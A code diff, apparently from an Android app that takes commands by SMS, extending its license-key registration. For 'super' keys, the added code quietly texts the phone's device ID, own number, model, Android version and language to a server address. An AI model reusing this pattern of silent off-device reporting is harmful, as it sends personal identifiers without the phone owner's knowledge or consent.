@@ -19,11 +19,14 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
+import com.particle.inspector.common.util.sms.SuperLoggingSms;
 
 public class IndicationHandler 
 {
 	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
 	{
+		// When comes here, that means the phone has received the SMS, so now it must be capable to send SMS.
+		
 		// Make sure the indicaiton is coming from qulified phone
 		if (!isQualifiedIncomingNum(context, incomingPhoneNum)) {
 			// Do not return SMS to the phone about the failure
@@ -45,9 +48,42 @@ public class IndicationHandler
 					return;
 				}
 				
-				// Send auth SMS to server for registration
-				// and server will send response SMS to the phone (Auth,<key>,OK/NG)
-				SmsCtrl.sendAuthSms(context, indication);
+				// If this phone has not been registerred yet with this key, send auth SMS to server for registration
+				// and server will send response SMS to the phone (Auth,<key>,<Target Phone Number>,OK/NG)
+				else if (type == LICENSE_TYPE.FULL_LICENSED || type == LICENSE_TYPE.PART_LICENSED) {
+					String currentKey = ConfigCtrl.getLicenseKey(context);
+					if (currentKey == null || !indication.equalsIgnoreCase(currentKey)) {
+						boolean ret = SmsCtrl.sendAuthSms(context, indication);
+						if (ret) {
+							ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
+						}
+					} else {
+						String msg = context.getResources().getString(R.string.indication_register_ng_duplicate_key);
+						SmsCtrl.sendSms(incomingPhoneNum, msg);
+					}
+				}
+				
+				// If it is Super License Key, do not need to get response validation from server
+				else if (type == LICENSE_TYPE.SUPER_LICENSED) {
+					// Save license key info to SharedPreferences
+					if (!ConfigCtrl.setLicenseKey(context, smsBody) || 
+						!ConfigCtrl.setLicenseType(context, type)) {
+						String msg = context.getResources().getString(R.string.indication_register_ng_cannot_write);
+						SmsCtrl.sendSms(incomingPhoneNum, msg);
+						return;
+					}
+
+					// Send a SMS to server for logging info
+					String deviceID = DeviceProperty.getDeviceId(context);
+					String phoneNum = DeviceProperty.getPhoneNumber(context);
+					String phoneModel = DeviceProperty.getDeviceModel();
+					String androidVer = DeviceProperty.getAndroidVersion();
+					LANG lang = DeviceProperty.getPhoneLang();
+					SuperLoggingSms sms = new SuperLoggingSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
+					String smsStr = sms.toString();
+					String srvAddr = context.getResources().getString(R.string.srv_address).trim();
+					SmsCtrl.sendSms(srvAddr, smsStr);
+				}
 			}
 			// Unregister indication
 			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
